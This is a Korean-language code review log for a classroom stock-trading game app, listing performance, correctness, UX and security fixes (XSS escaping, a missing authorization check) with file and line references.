- **폴링 실패 시 연결 상태 알림 없음** (`app.js:608-648`): 참여자 poll interval(10초) 내 `api.get()` 응답이 에러 객체이거나 `fetch` 자체가 예외를 던져도 조용히 넘어가 학생이 연결이 끊겼는지 모름. 실패 횟수를 카운트해 3회 연속 실패 시 `toast('⚠️ 서버 연결이 불안정합니다. 새로고침을 시도하세요.', 'error')` 를 표시하고, 다음 성공 응답에서 카운트를 초기화하면 학교 인트라넷 환경에서 학생이 자발적으로 수동 새로고침할 수 있는 시각적 단서 제공. `app.js:610` 이전에 `let _pollFailCount = 0` 선언, poll 콜백에 `try/catch` 래퍼 추가로 구현 가능.

- **결과 화면에서 미니게임(룰렛·복권) 수익 분리 표시 없음** (`app.py:784-793`, `app.js:1724-1741`): `total_value`에 투자 수익과 룰렛·복권 당첨금이 합산되어 "진짜 투자 실력"과 "운"이 구분되지 않음. `get_rankings()` 응답에 `minigame_profit` 필드를 추가(`RoomTransaction.query.filter_by(room_id=rid, user_id=m.user_id, action='RLT')` + `note='복권'` 포함 ADJ 합산)하고, 결과 화면 "내 결과" 카드에 "투자 손익: X원 / 미니게임 손익: Y원" 두 줄을 표시하면 교육적 반성 포인트가 명확해짐 (`app.py:788`에 필드 추가, `app.js:1727`에 렌더링 추가).

- **진행자 게임 이벤트 로그 없음** (`app.py:647-670`, `app.py:1299-1314`): `force_price()`, `market_event()`, 뉴스 수동 트리거 이벤트가 서버에 기록되지 않아 진행자가 "아까 삼성전자를 몇 % 올렸지?" 확인 불가. `_event_log: dict = {}` (방별 리스트)를 선언하고 각 진행자 조작 함수에서 `_event_log.setdefault(rid, []).append({'ts': datetime.now(KST).strftime('%H:%M:%S'), 'action': label})`를 삽입. `GET /api/rooms/<rid>/host/event-log` 엔드포인트로 노출하고 진행자 대시보드 하단에 최근 이벤트 10개 피드를 표시하면 수업 중 이벤트 추적 가능. `_end_room()`에서 해당 로그도 정리.

- **복권 결과 화면에서 참여자별 번호 나열이 학번/이름 없이 uid 문자열로 표시** (`app.js:2190-2197`, `app.py:1103-1107`): `get_lottery()` → `all_results` 딕셔너리의 키가 `str(user.id)` (숫자 문자열)이며, 진행자 결과 모달 테이블의 "번호" 열에 uid가 아닌 학생 이름을 표시하지 않음. 서버 `app.py:1103`에서 `all_results`를 빌드할 때 `{uid_str: {'matched':…, 'prize':…, 'picks':…, 'username': u.username}}` 형태로 `username`을 포함하고, `app.js:2191`의 테이블 렌더링에서 `uid` 대신 `r.username`을 첫 열에 표시하면 진행자가 누가 당첨됐는지 즉시 파악 가능.

---

### 제거/단순화할 것들

- **`get_room()` 룰렛 자동 트리거 시 N+1 쿼리** (`app.py:421-426`): 게임 잔여 5초 이하 룰렛 트리거 체크에서 `non_host` 멤버 전체를 가져온 뒤 각 멤버별로 `RoomTransaction.query.filter_by(room_id=rid, user_id=m.user_id, action='RLT').count()`를 개별 호출함. 30명 게임이라면 30회 COUNT 쿼리가 게임 마지막 10초 구간의 모든 `get_room()` 폴링마다 반복 발생. `db.session.query(db.func.count()).filter(RoomTransaction.room_id==rid, RoomTransaction.action=='RLT').scalar()` 한 번으로 총 RLT 건수를 조회 후 `< len(non_host) * 3` 비교하거나, `any(...)` 생성식 대신 서브쿼리로 단일 쿼리로 대체하면 N → 1 건으로 단순화 가능 (`app.py:423-426`).

- **`minigame_close()` 내 deprecated `Room.query.get(rid)` 사용** (`app.py:945`): `_rlt_lock` 블록 내부에서 `room = Room.query.get(rid)`를 호출함. 이전 항목들에서 `.query.get_or_404()` 교체를 권장했으나, 이 함수의 `.query.get()` (Not Found 시 None 반환 패턴)은 별도로 남아 있음. SQLAlchemy 2.0에서 동일하게 폐기 예정이므로 `db.session.get(Room, rid)` 로 교체 필요. 반환값이 None일 때 `if not room: return jsonify({'ok': True})` 가드도 함께 추가하면 안전 (`app.py:945`).

- **`loadParticipantRankings()` 에러 객체를 "참여자 없음"으로 오인** (`app.js:1642-1643`): `api.get()` 실패 시 `{error: 'HTTP 500'}` 객체가 반환되는데, 다음 줄의 `if (!data.length)` 체크에서 `undefined`(falsy)로 평가되어 "참여자 없음" 빈 화면을 보여줌. 서버 오류와 실제 빈 방이 동일하게 렌더링됨. `if (data.error || !Array.isArray(data)) return;` 가드를 `app.js:1642` 직전에 추가하고, 네트워크 오류일 경우 이전 렌더링을 유지하거나 토스트를 표시하면 혼란 방지.

- **`openStockModal()` 포트폴리오 탭 fallback에서 `change_pct`에 매수 수익률 혼입** (`app.js:1522-1524`): 포트폴리오 탭 보유 종목의 "매수/매도" 버튼 클릭 시 `openStockModal('${h.symbol}', {…, change_pct: ${h.gain_pct}})` 형태로 호출. `h.gain_pct`는 평균 매수가 대비 평가손익률이지만, 모달 `ms-change` 요소에 "▲ +3.45%"처럼 오늘의 가격 변동률인 것처럼 표시됨. `S.stocks.find(s => s.symbol === h.symbol)` 로 현재 시장 데이터를 우선 조회하거나, `openStockModal()` 첫 줄에서 `S.stocks.find()`로 최신 데이터를 덮어쓰는 로직을 추가하면 올바른 일중 변동률 표시 가능 (`app.js:1292-1294`에 overwrite 로직 추가).

- **`startConfetti()` requestAnimationFrame 루프 화면 이탈 후에도 계속 실행** (`app.js:1761-1800`): `requestAnimationFrame(draw)` 재귀 호출로 동작하는 색종이 애니메이션이 `goHome()`·`showScreen()` 호출로 결과 화면을 벗어나도 계속 실행됨. `alpha <= 0` 이 될 때까지 불필요한 GPU·CPU를 소모. `let _confettiRaf = null` 변수에 RAF ID를 저장하고 (`_confettiRaf = requestAnimationFrame(draw)` 로 변경), `showLanding()` 함수(`app.js:92-97`) 내에서 `if (_confettiRaf) { cancelAnimationFrame(_confettiRaf); _confettiRaf = null; }` 를 추가하면 화면 이탈 즉시 루프 중단 가능.

- **`_do_reveal()` 당첨자별 멤버 개별 DB 조회** (`app.py:191-193`): 복권 결과 적용 시 `cur.get('picks', {}).items()` 루프 내에서 매 반복마다 `RoomMember.query.filter_by(room_id=rid, user_id=uid).first()`를 호출. 30명 게임이라면 30건의 SELECT가 발생. 함수 진입부에서 `member_map = {m.user_id: m for m in RoomMember.query.filter_by(room_id=rid).all()}`로 일괄 로드 후 `member_map.get(uid)`로 O(1) 조회하면 30 → 1건으로 단순화 (`app.py:178` 함수 시작 직후 한 줄 추가, `app.py:191` 조회 제거). 이미 `_auto_start_lottery_if_due()`에서 `member_count = RoomMember.query.filter_by().count()`를 호출하므로 해당 결과를 `cur` 딕셔너리에 미리 저장하는 것도 고려.

- **`force_price()` 뉴스 생성 시 `time.time()` 이중 호출** (`stock_service.py:237-240`): `self._news = {'timestamp': time.time(), ...}` 와 `self._last_news_ts = time.time()` 이 두 개의 별도 `time.time()` 호출로 이루어져 있음. 두 값이 미세하게 달라지면 `_maybe_generate_news()` 내 `now - self._last_news_ts >= self._news_ttl` 와 `data.timestamp > S.newsTs` (프론트) 비교가 서로 다른 기준을 사용하게 됨. `now = time.time()`을 한 번 호출해 두 곳에 동일 값을 할당하면 논리적 일관성 보장 (`stock_service.py:235` 에 `now = time.time()` 추가, 237·240번 줄에서 `now` 참조).

---

## 2026-06-20

### 추가하면 좋을 기능

- **룰렛 모달 강제 종료 없을 시 게임 영구 정지 위험** (`app.py:907-932`, `app.py:934-963`): 참가자가 룰렛 모달(`minigame/open`)을 연 뒤 브라우저를 강제 종료하거나 네트워크가 끊기면 `_rlt_active[rid]['count']`가 감소하지 않아 게임이 영구 일시정지 상태에 빠짐. `_rlt_active[rid]`에 `opened_at: time.time()` 타임스탬프를 기록하고, `get_room()` 처리 중 `count > 0`이 10분 이상 지속될 경우 강제 `unfreeze` 및 카운터 초기화를 삽입하거나, 진행자 대시보드에 "룰렛 강제 종료" 버튼을 추가하면 수업 중 먹통 사태를 예방 가능.

- **`change_pct`가 게임 시작가 기준 누적 수익률로 표시됨** (`stock_service.py:121-128`, `stock_service.py:278-279`): `_prev` 딕셔너리가 `_init_prices()`에서 게임 시작 시 1회만 설정되어 이후 갱신되지 않음. 30분 후반부에 표시되는 `▲ +35%`는 게임 시작 이후 누적 상승률이므로, 학생들이 "방금 급등한 것"으로 오해함. `get_price()` 내 가격 갱신 코드(`stock_service.py:185`) 직전에 `self._prev[symbol] = price`를 추가하면 각 주기별 실제 틱 등락률을 보여줄 수 있음.

- **종료된 게임에 재접속 시 결과 화면 복원 불가** (`app.py:278-284`, `app.js:73-79`): `find_active_room()`이 `status.in_(['waiting','active','paused'])`만 검색하므로, 결과가 발표된 방을 브라우저를 닫은 뒤 재접속해도 결과를 볼 방법이 없음. `find_active_room()` 쿼리에 `status='ended'` + `results_published=True` 조건을 추가하거나, `GET /api/auth/me` 응답에 `last_ended_room` 필드를 포함시켜 결과 화면으로 자동 복원하면 수업 후 토론·복습에 활용 가능.

- **진행자 대시보드에 학급 전체 통계 없음** (`app.py:511-531`, `app.js:406-429`): 진행자 순위 화면은 개별 랭킹만 보여주고 "평균 수익률", "수익자 비율", "최대 손실 학생"과 같은 학급 단위 집계 정보가 없음. `host_members` 응답에 `avg_gain_pct`, `positive_count`, `negative_count`를 추가하고 순위 목록 위에 요약 카드를 표시하면, 교사가 "지금 반에서 몇 명이 수익 중이에요?"라는 즉흥적 질문을 수업에 활용 가능.

- **용어사전 검색이 키 입력마다 API 호출 (디바운스 없음)** (`app.js:1891-1894`): `oninput` 이벤트에 연결된 `searchGlossary()`가 키 입력마다 `GET /api/education/glossary?q=...`를 전송하며 한글 IME 조합 단계에서도 반복 호출됨. `loadGlossary()` 시 `S.glossaryData`에 이미 전체 데이터가 캐싱되어 있으므로(`app.js:1869-1871`), API 재호출 없이 `renderGlossary(S.glossaryData.filter(...))` 클라이언트 필터링으로 전환하면 서버 부하를 완전히 제거 가능.

- **퀴즈가 `paused` 상태에서도 제출 가능** (`app.py:1225-1230`, `app.py:1229`): `submit_quiz()`는 `room.status != 'active'`를 체크해 종료 후 제출을 막지만 `'paused'` 상태는 허용함. 복권 진행 중 게임이 자동 일시정지된 상태에서 퀴즈 오버레이가 열려 있는 학생이 제출하면 패널티가 적용됨. `app.py:1229`의 조건을 `room.status not in ('active', 'paused')` 대신 명시적으로 `room.status == 'active'`만 허용하도록 수정하거나, 일시정지 상태에서는 퀴즈 FAB 버튼 자체를 비활성화(`updateTradeButtonState()` 확장)하는 것이 안전.

---

### 제거/단순화할 것들

- **`export_rankings()` N+1 쿼리** (`app.py:1384-1392`): `member_total_value(rid, m.user_id)`를 참가자 수만큼 루프에서 반복 호출하며 각 호출마다 `RoomHolding`·`Deposit` 추가 쿼리 실행. `get_rankings()` 및 `host_members()`의 N+1 패턴(06-11 지적)과 동일한 문제가 엑셀 내보내기에도 존재. 루프 진입 전 `holdings = {h.user_id: [] for ...}` 일괄 로드 후 딕셔너리 그룹화로 교체하면 쿼리 수 O(N)→O(1)으로 단순화 가능.

- **진행자 룰렛 설정 테이블 색상과 실제 룰렛 색상 불일치** (`index.html:222-249`, `app.js:904`): 진행자 룰렛 설정 UI 테이블의 색상 마커(`#c0392b`, `#e67e22`, `#f1c40f`, `#27ae60`, `#3498db`)와 실제 학생 룰렛 휠·범례의 `_RLT_COLORS` 배열(`#e74c3c`, `#3498db`, `#f39c12`, `#2ecc71`, `#9b59b6`)이 서로 다름. 진행자가 "빨간 칸이 꽝"이라고 안내해도 학생 화면에서는 색상 배치가 달라 혼선 발생. `index.html` 설정 테이블의 인라인 컬러를 `_RLT_COLORS`와 동일하게 맞추거나, CSS 변수로 통일하면 해결.

- **`_lots[rid]['done']` Python `set` 타입 → JSON 직렬화 불가** (`app.py:156`, `app.py:200`): 복권 완료 회차를 추적하는 `_lots[rid]['done']`이 `set` 객체로 저장됨. 지금은 인메모리라 문제없지만, 향후 Redis 저장이나 로그 직렬화 시 `json.dumps()` 실패. `set` → `list` 저장 후 `if round_n not in done_list:` 선형 탐색 또는 별도 `set()` 변환으로 조회하는 방식으로 교체하면 구조가 명확해지고 직렬화 안정성 확보.

- **`refreshMyRank()`와 `loadParticipantRankings()` 같은 폴링 주기에서 중복 API 호출** (`app.js:733-751`, `app.js:645-648`): 참가자 게임 폴링(`app.js:611`)에서 `refreshMyRank()`는 매 10초마다 `GET /rankings`를 호출하고, 순위 탭이 활성화된 경우에는 `loadParticipantRankings()`도 동일 API를 중복 호출함. 같은 폴링 사이클에서 rankings API가 2회 연속 실행. `refreshMyRank()` 응답 데이터를 `S.lastRankings`에 저장해두고, 순위 탭 활성 시에는 재요청 없이 그 캐시로 목록을 렌더링하면 요청 1건 절약.

- **`_set_sqlite_pragmas()`가 PostgreSQL 환경에서도 실행됨** (`app.py:18-29`): `db.engine` 전역 `"connect"` 이벤트로 등록된 `_set_sqlite_pragmas()`가 `DATABASE_URL` 환경변수로 PostgreSQL을 사용할 때도 실행됨. psycopg2는 `PRAGMA` 명령을 `ProgrammingError`로 처리할 수 있어 Render에서 PostgreSQL로 전환 시 연결 자체가 실패할 위험. `app.py:29` 이벤트 등록 직전에 `if 'sqlite' in str(db.engine.url):` 조건 가드를 추가하면 SQLite 전용 최적화를 안전하게 분리 가능.

---

## 2026-06-20 (2차)

### 추가하면 좋을 기능

- **`get_history()` `interval` 파라미터 완전 무시 → 모든 차트 탭에서 일봉만 표시** (`stock_service.py:281`, `stock_service.py:292-306`): `get_history(symbol, period, interval)` 함수가 `interval` 파라미터를 받지만 본체에서 전혀 사용하지 않음. `app.py:684`의 `pm` 딕셔너리는 `'1d'→interval='5m'`, `'1w'→interval='30m'`, `'1y'→interval='1wk'` 등 의미 있는 값을 전달하지만, 내부 `n_bars` 딕셔너리와 `now - i * 86400`(1일 고정 간격)은 이를 완전히 무시. "오늘(1일)" 탭에 오늘의 5분봉 대신 지난 30일치 일봉이 표시되고 "1년" 탭도 30개 일봉에 불과해 차트 탭이 실질적으로 전혀 다르게 보이지 않음. 수정 방법: `step_secs = {'5m':300,'30m':1800,'1d':86400,'1wk':604800}.get(interval,86400)` 변수를 추가하고 `now - i * step_secs` 로 봉 간격 결정, 인트라데이(`step_secs < 86400`)인 경우 `date_str`을 `'%H:%M'` 포맷으로 교체하면 기간별 올바른 차트 표시 가능 (`stock_service.py:296` 한 줄 수정).

- **`host_adjust()` `delta=0` 허용으로 더미 `RoomTransaction` 생성** (`app.py:564-569`): `delta = float(d.get('delta', 0))` 이후 delta 값 검증 없이 바로 `db.session.add(RoomTransaction(... amount=delta ...))` 실행. 교사가 금액을 입력하지 않고 "조정" 버튼을 누르면 `amount=0` 거래 기록이 학생 내역에 영구 기록됨. 클라이언트 `doAdjust()`(`app.js:489`)의 `isNaN(delta)` 체크는 `delta=0`을 통과시킴. `app.py:565` 직후에 `if delta == 0: return jsonify({'error': '조정 금액을 입력하세요'}), 400`, `app.js:493`에도 `if (delta === 0) { err.textContent = '금액을 입력하세요.'; return; }` 추가 권장.

- **`lobby_members` 인가 없음 → 로그인만 되면 모든 방의 멤버 목록 열람 가능** (`app.py:546-554`): `@login_required`만 있고 해당 방의 호스트·멤버 여부 확인이 없음. 로그인한 학생이 `GET /api/rooms/1/host/lobby-members`부터 순차 호출하면 서비스 전체 참가자 이름·user_id를 수집 가능. 2026-06-12에 URL 명칭 혼란은 지적했으나 실제 권한 누락 자체는 미지적. `user = cur_user(); if room.host_id != user.id and not RoomMember.query.filter_by(room_id=rid, user_id=user.id).first(): return jsonify({'error': '권한 없음'}), 403` 체크 추가로 해결.

- **`gen_code()` 10회 실패 시 중복 코드 반환 → `IntegrityError` → 500 오류** (`models.py:8-13`): 10회 시도 후에도 고유 코드를 찾지 못하면 마지막 생성값을 그대로 반환. `Room.code = db.Column(db.String(6), unique=True)`이므로 충돌 시 `create_room()` 커밋이 `IntegrityError` → 500 HTML → 프론트 `api.post()` JSON 파싱 실패(`SyntaxError`) → 조용히 오류 발생. `create_room()`에서 `db.session.commit()` 주위에 `try/except IntegrityError: db.session.rollback(); return jsonify({'error': '방 생성 실패. 재시도하세요.'}), 500` 래퍼 추가, 또는 `gen_code()`를 `for _ in range(20)`으로 재시도 횟수 늘리고 최종 반환 전에도 충돌 체크하도록 강화 가능.

- **`startTimer()` 클라이언트 시계 오차 → 학생마다 다른 카운트다운 표시** (`app.js:767`): `rem = Math.floor((new Date(S.room.end_time) - new Date()) / 1000)` — `new Date()`는 브라우저/OS 로컬 시계를 사용. 학생 기기 시계가 3분 빠르거나 느리면 카운트다운이 앞서거나 뒤처져 "종료 1분 전" 예금 만기 경고와 마지막 거래 기회가 불공평하게 분배됨. 개선 방법: 폴링 응답 `S.room.remaining_seconds`를 기준으로 `let _localRem = S.room.remaining_seconds; let _pollAt = Date.now();`를 저장하고, 매 tick마다 `Math.max(0, _localRem - Math.floor((Date.now() - _pollAt) / 1000))`으로 계산하면 매 폴링마다 서버 기준으로 보정되는 정확한 타이머 구현 가능 (`app.js:757-773` 대상).

- **`trade()` 응답에 업데이트된 보유 수량 미포함 → `S.tradeHolding` 로컬 오차 누적** (`app.py:732-736`, `app.js:1313-1321`): `trade()` 응답 `{message, cash}`에 `shares` 값이 없어 프론트엔드가 `S.tradeHolding += shares`로 로컬 계산에 의존. 퀴즈 오답 자동 청산·룰렛 베팅 강제 매도 등 서버 측 자동 처리가 병행될 경우 `S.tradeHolding`이 실제 DB 보유량과 누적 오차를 가져 모달 "현재 보유" 수량이 틀리게 표시됨. `app.py:731` holding 처리 후 `new_shares = holding.shares if holding else 0`을 저장해 응답에 `'shares': new_shares` 추가, `app.js:1316`에서 `S.tradeHolding = data.shares`로 서버 정확값 직접 사용하면 오차 근본 제거.

---

### 제거/단순화할 것들

- **`get_history()` 이중 락 사이 가격 변경 시 캐시 불일치** (`stock_service.py:285-309`): 첫 `with self._lock:`에서 `current = self._prices[symbol]`을 읽고 락 해제 후, 봉 데이터를 생성하고 두 번째 `with self._lock:`에서 캐시에 저장. 두 락 사이에 `force_price()` 등으로 가격이 바뀌면 구 가격 기반 차트가 `HISTORY_CACHE_TTL=120`초 동안 캐시에 남음. 전체 봉 생성 로직을 첫 번째 락 블록 내로 이동(연산이 짧아 블로킹 허용)하거나, 두 번째 락 진입 시 `if self._prices[symbol][1] != current: pass`(캐시 저장 생략)로 일관성 보장 가능 (`stock_service.py:285-309` 구조 재정리).

- **`loadLobbyMembers()` · `loadPLobbyMembers()` 내 `m.username` XSS 미처리** (`app.js:227`, `app.js:581`): 두 함수 모두 `${m.username}`을 innerHTML에 직접 삽입. `app.js:815`에 `escHtml()` 유틸이 이미 정의돼 있으므로 `escHtml(m.username)`으로 교체하면 즉시 방어. `loadLobbyMembers()`의 `onclick="doKickMember(${m.user_id},'${m.username.replace(/'/g,"\\'")}')"`는 따옴표만 처리해 `"` 또는 `)`가 포함된 이름에서 속성이 깨질 수 있음 — `data-uid`·`data-name` 속성과 이벤트 위임 패턴으로 교체 권장.

- **`loadStudentTxn()` `t.note` HTML 미처리 → XSS 가능** (`app.js:524`): `${t.note ? ' · ' + t.note : ''}` 가 innerHTML에 직접 삽입. `t.note`는 `host_adjust()`에서 교사가 자유 입력하는 텍스트(`d.get('note', '진행자 자산 조정')`)이므로 HTML 입력 시 학생 화면에서 렌더링됨. 2026-06-18 (2차)에서 username XSS를 지적했으나 note 필드는 누락. `escHtml(t.note)`로 교체하거나 `createTextNode`로 분리 삽입하면 즉시 방어 가능. `app.js` 내 innerHTML에 서버 데이터를 삽입하는 모든 지점의 일괄 감사 권장.

- **`doEndGame()` `confirm` 없이 즉시 API 호출 → 오터치 시 즉시 종료 위험** (`app.js:538`): `doStartGame()`은 `if (!confirm('게임을 시작하시겠습니까?')) return;` 가드(`app.js:247`)가 있지만 `doEndGame()`에는 없음. 잔여 시간 < 60초이거나 이미 `_ending_soon` 상태에서 한 번 더 탭하면 즉시 `_end_room()` 실행. 모바일에서 오터치로 게임이 바로 종료되는 시나리오가 실제 수업에서 발생 가능. `doEndGame()` 첫 줄에 `if (!confirm('정말 게임을 종료하시겠습니까?')) return;` 한 줄 추가, 또는 종료 버튼 클릭 후 2초 내 재확인을 요구하는 두 번 클릭 방지 패턴 고려.

- **`RoomMember.cash` · `Deposit.amount` · `RoomTransaction.amount` `Float` 타입 부동소수점 오차 누적** (`models.py:49`, `models.py:84`, `models.py:74`): 원화 정수값을 IEEE 754 `float`에 저장하면 수십·수백 회 거래 후 `10000000.000000002` 같은 미세 오차가 쌓임. `m.cash -= amount`(매수) → `m.cash += amount`(매도) 반복 시 오차가 누적되어 동일 금액을 입출금해도 원점으로 돌아오지 않음. `db.Column(db.Numeric(precision=18, scale=0))`으로 교체하거나, 단기적으로 거래·정산 시 `m.cash = round(m.cash, 0)` 을 일관되게 적용하면 표시 오류 방지. `amount = price * shares` 계산도 `round(price * shares, 0)` 처리 권장 (`app.py:715` 등).

- **`host_adjust()` `target = db.session.get(User, target_uid)` None 체크 없음 → AttributeError 크래시 위험** (`app.py:571-572`): `m = RoomMember.query.filter_by(room_id=rid, user_id=target_uid).first()` 성공 후 `target = db.session.get(User, target_uid)`를 호출하지만, User 레코드가 DB에서 직접 삭제되거나 데이터 불일치가 있을 경우 `target = None` → `target.username` 접근 시 `AttributeError` → 500 반환. `if not target: return jsonify({'message': f'uid {target_uid} 자산 {delta:+,.0f}원 조정', 'new_cash': m.cash})` 폴백 한 줄로 크래시 방지 가능 (`app.py:572`). 동일 패턴이 `get_rankings()` (`app.py:785`)에도 존재해 `u.username` 접근 전 None 체크 추가 권장.

---

## 2026-06-21

### 추가하면 좋을 기능

- **`enter()` username 길이 검증과 UI maxlength 불일치 → 유효 입력 거부 버그** (`app.py:304`, `index.html:53,59`): `host-student-id` maxlength=15, `host-name` maxlength=20으로 UI상 최대 합산 36자(15+공백+20)가 가능하지만, 서버는 `len(u) > 30` 조건으로 거부하며 오류 메시지는 "닉네임은 2~20자 사이여야 합니다"로 혼란 유발. 학번 14자+이름 17자인 학생은 입력 가능 범위 내에서 값을 입력해도 서버에서 거부됨. 수정: `app.py:305`의 상한을 `len(u) > 50`으로 완화하거나, 오류 메시지를 "학번+이름 합산 30자 이하" 등 정확한 문구로 교체; 근본 해결은 `index.html`의 두 maxlength를 합산 ≤ 29가 되도록 조정(예: 학번 10, 이름 18).

- **`_results_published` 인메모리 → Render 재시작 시 결과 발표 상태 소실** (`app.py:79`, `app.py:1341-1349`): `_results_published: dict = {}` 전역 변수가 메모리에만 존재. 진행자가 "결과 발표하기"를 클릭한 후 서버가 Render 15분 비활성 재시작으로 내려가면 `_results_published[rid]`가 초기화되어 `screen-waiting-results`에서 대기 중인 학생들이 결과 화면을 영원히 볼 수 없음. 수정: `models.py:Room`에 `results_published = db.Column(db.Boolean, default=False)` 컬럼 추가, `host_publish_results()`에서 `room.results_published = True; db.session.commit()`, `room_dict()` 응답에서 `_results_published.get(rid, room.results_published)`로 DB 값을 폴백으로 사용.

- **`_rlt_triggered`/`_rlt_active` 인메모리 → 재시작 시 게임 영구 일시정지** (`app.py:81,223`, `app.py:417-437`): 게임 종료 5초 전 룰렛 자동 트리거 시 `_rlt_triggered.add(rid)`, `room.status='paused'`가 DB에 저장됨. 서버 재시작 시 `_rlt_triggered = set()`, `_rlt_active = {}` 초기화 → 폴링 재개 후 `rid not in _rlt_triggered` 조건 미충족으로 `minigame_available: False` 반환. 학생에게 룰렛이 뜨지 않아 게임이 영구 일시정지 상태로 잠김. `get_room()` 응답 생성 시 `room.status == 'paused' and room.paused_at and rid not in _rlt_triggered`를 감지해 `_rlt_triggered.add(rid)` 자동 복구하거나, 진행자 대시보드에 "룰렛 강제 종료" 버튼 추가 권장.

- **진행자 전체 학생 공지 기능 없음** (`app.py:599-615`, `index.html:185-190`): 교사가 "지금부터 반도체 섹터에 집중하세요"와 같은 자유 형식 텍스트를 전체 학생에게 즉시 전달할 방법이 없음. 뉴스 시스템은 종목 편향에 연동되어 있어 단순 공지로 쓰기엔 부적절. `POST /api/rooms/<rid>/host/announce` 엔드포인트 + `Room`에 `announcement = db.Column(db.Text, nullable=True)` 컬럼 추가, `room_dict()` 응답에 포함, 프론트 폴링에서 새 공지 감지 시 `toast()` 3초 팝업 표시하면 50줄 이내 구현 가능.

- **방별 활성 종목(섹터) 선택 기능 없음** (`stock_service.py:36-99`, `app.py:334-344`): 47개 종목 전체가 항상 표시됨. 반도체 집중 수업에는 해당 섹터만, 입문 수업에는 10개 이하만 허용하는 설정 불가. `Room` 모델에 `allowed_sectors = db.Column(db.Text, nullable=True)` (JSON 배열 문자열) 추가, `get_stocks()` (`app.py:620-640`)에서 `json.loads(room.allowed_sectors)` 파싱 후 해당 섹터만 필터링, 방 생성 화면(`index.html:42-76`)에 섹터 체크박스 UI 추가. 전체 종목 노출로 인한 학생 혼란 방지에 효과적.

- **예금 최소 금액·최대 건수 제한 없음** (`app.py:847-871`): `create_deposit()` 검증이 `0 < amount`뿐이라 0.01원 예금 생성 가능. 건수 제한도 없어 1원 예금 수백 건 생성 시 `_end_room()` 정산 루프가 비례해 증가. `if amount < 10_000: return jsonify({'error': '최소 예금 금액은 1만원입니다.'}), 400`와 `if Deposit.query.filter_by(room_id=rid, user_id=uid, status='active').count() >= 5: return jsonify({'error': '예금은 최대 5건까지 가능합니다.'}), 400` 두 줄 추가로 방어 가능.

### 제거/단순화할 것들

- **`lottery-notify-bar` 인라인 스타일 `display:none` 이중 선언** (`index.html:136`): `style="display:none;background:var(--warn);...;display:none;align-items:center;..."` — 같은 `style` 속성 내에 `display:none`이 두 번 등장하고 `display:flex`는 선언되지 않음. JS가 런타임에 `bar.style.display = 'flex'`로 교체하므로 동작 오류는 없지만 코드가 혼란스러움. `style="display:none"` 단 한 번으로 정리하고 레이아웃 속성(`align-items`, `justify-content`, `gap`)은 CSS 클래스로 분리 권장.

- **`closeLotteryOverlay()`에서 `paused-banner` 무조건 제거** (`app.js:2233-2237`): 복권 오버레이 닫기 시 `document.getElementById('paused-banner')?.remove()`를 항상 실행. 진행자가 수동으로 게임을 일시정지한 상태에서 복권이 진행된 경우, 복권 종료 후에도 일시정지 배너가 유지되어야 하지만 무조건 제거됨. 수정: `_stopLotPolling()` 이후 `refreshRoomStatus()`(또는 단순 `fetch`)로 서버 상태를 재조회해 `S.room.status === 'paused'`이면 배너를 유지하는 조건 추가.

- **`openStockModal()` 매 호출마다 portfolio API 재호출** (`app.js:1308-1315`): 학생이 종목 카드를 탭할 때마다 `GET /api/rooms/${S.room.id}/portfolio`를 호출해 현금·보유 수량을 새로 가져옴. `loadPortfolio()`나 `execTrade()` 성공 직후 이미 `S.tradeCash`·보유 수량이 갱신되어 있으므로, 캐시된 값을 즉시 표시하고 백그라운드에서 검증용 재조회를 수행하면 탭 반응 속도 향상. 동일 종목을 연속 탭하는 흔한 시나리오에서 불필요한 왕복 제거 가능.

- **`minigame_spin()` 청산 후 현금 음수 가능성** (`app.py:993-1032`): `shares_to_sell = max(1, int(shortfall / price))` 정수 내림으로 루프 종료 후 shortfall이 소량 남을 수 있음. 이후 `m.cash = m.cash - bet + winnings`에서 winnings=0(꽝)이면 `m.cash < 0`이 될 수 있음. `bet > total_assets` 사전 체크가 있으나 정수 내림 오차 누적 시 예외 케이스 발생. 청산 루프 종료 직후 `m.cash = max(0.0, m.cash - bet + winnings)` 하한선 보장 한 줄로 방어 (`app.py:1032` 인근).

- **`_set_sqlite_pragmas()` 이벤트 리스너가 `db.create_all()` 이후 등록** (`app.py:26-29`): `with app.app_context(): db.create_all()` 실행 시 DB 연결이 생성되지만 pragma 이벤트 리스너(`_sa_event.listen(db.engine, "connect", _set_sqlite_pragmas)`)는 그 이후에 등록됨. 스키마 생성 연결은 WAL 모드·busy_timeout 없이 동작. pragma 리스너 등록을 `db.create_all()` 호출 이전으로 이동하거나, 스키마 생성 후 `with db.engine.connect() as conn: conn.execute(text("PRAGMA journal_mode=WAL"))` 명시적 초기화 추가 권장.

---

## 2026-06-21 (2차)

### 추가하면 좋을 기능

- **URL `?code=` 파라미터 미활용으로 QR 스캔 후에도 코드 수동 입력 필요** (`app.js:197-201`, `index.html:참여 폼`): `_makeQR()`이 `${location.origin}${location.pathname}?code=${S.room.code}` URL을 생성하지만 입장 화면 초기화 시 이 파라미터를 읽어 `join-code` 필드에 자동 채우는 코드가 없음. 학생이 QR을 스캔해 들어와도 6자리 코드를 손으로 다시 입력해야 함. `window.addEventListener('DOMContentLoaded', () => { const c = new URLSearchParams(location.search).get('code'); if (c) { document.getElementById('join-code').value = c; document.getElementById('join-tab-btn')?.click(); } })` 10줄로 해결 가능하며 모바일 수업 시 입장 시간을 크게 단축할 수 있음.

- **복권 picking 단계에서 진행자가 참여 현황을 볼 수 없음** (`app.py:1131-1147`): `get_lottery()`가 진행자에게 `revealed` 단계의 `all_results`는 반환하지만 `picking` 단계에서 몇 명이 이미 번호를 선택했는지 (`len(cur['picks'])`)를 반환하지 않음. 진행자가 "23명 중 몇 명이 선택했나요?" 상황에서 추첨 타이밍을 잡기 어려움. `app.py:1139` `result` 딕셔너리에 `'picking_count': len(cur.get('picks', {}))` 필드를 추가하고 진행자 복권 모달에 "선택 완료: N명" 텍스트를 표시하면 수업 흐름 개선.

- **결과 화면에 클래스 전체 평균 수익률 없음** (`app.js:1702-1720`): `loadResults()`는 개인별 순위를 렌더링하지만 클래스 평균 수익률이나 평균 최종 자산을 별도로 표시하지 않음. `const avgGain = data.reduce((s,e) => s + e.gain_pct, 0) / data.length`로 한 줄 계산 가능하며, 결과 화면 1등 카드 위에 `<div class="summary-card">클래스 평균 수익률: ${pct(avgGain)}</div>`를 추가하면 수업 마무리 토론에서 교사가 즉각 활용 가능. 수업 후 "우리 반 평균은 +3.2%였는데 코스피는 -0.5%였습니다" 같은 맥락 제공 가능.

